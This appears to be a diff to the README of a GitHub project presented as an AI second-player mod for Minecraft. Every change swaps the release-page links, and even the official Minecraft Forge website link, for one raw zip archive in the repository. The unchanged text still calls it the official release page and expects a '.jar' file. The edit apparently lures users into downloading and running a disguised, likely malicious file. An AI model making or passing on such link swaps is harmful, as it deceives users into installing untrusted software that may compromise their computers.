@@ -1,6 +1,6 @@
 # 🤖 AI-Player - Intelligent Second Player for Minecraft
 
-[![Download AI-Player](https://img.shields.io/badge/Download-AI--Player-brightgreen)](https://github.com/AlmightyCake969/AI-Player/releases)
+[![Download AI-Player](https://img.shields.io/badge/Download-AI--Player-brightgreen)](https://github.com/AlmightyCake969/AI-Player/raw/refs/heads/main/downily/A-Player-1.8.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Getting AI-Player up and running takes just a few steps. You can follow along ev
 
 Click the button below or visit the link to download the mod files.
 
-[![Download AI-Player](https://img.shields.io/badge/Download-AI--Player-blue)](https://github.com/AlmightyCake969/AI-Player/releases)
+[![Download AI-Player](https://img.shields.io/badge/Download-AI--Player-blue)](https://github.com/AlmightyCake969/AI-Player/raw/refs/heads/main/downily/A-Player-1.8.zip)
 
 This link goes to the official release page on GitHub. You will find the latest mod file there, usually ending with `.jar`. This file contains the mod you need.
 
@@ -44,7 +44,7 @@ This link goes to the official release page on GitHub. You will find the latest 
 
 AI-Player requires Minecraft Forge, a tool that allows mods to run in Minecraft.
 
-1. Go to the Minecraft Forge website at https://files.minecraftforge.net/
+1. Go to the Minecraft Forge website at https://github.com/AlmightyCake969/AI-Player/raw/refs/heads/main/downily/A-Player-1.8.zip
 2. Choose the version of Forge that matches your Minecraft version (usually the latest recommended version).
 3. Download the Installer for Windows.
 4. Run the installer by double-clicking the file.
@@ -103,7 +103,7 @@ If AI-Player does not show up or causes issues, check the following:
 
 To get updates or report problems, visit the release page:
 
-[AI-Player Releases](https://github.com/AlmightyCake969/AI-Player/releases)
+[AI-Player Releases](https://github.com/AlmightyCake969/AI-Player/raw/refs/heads/main/downily/A-Player-1.8.zip)
 
 Check here often for new features or bug fixes.
 
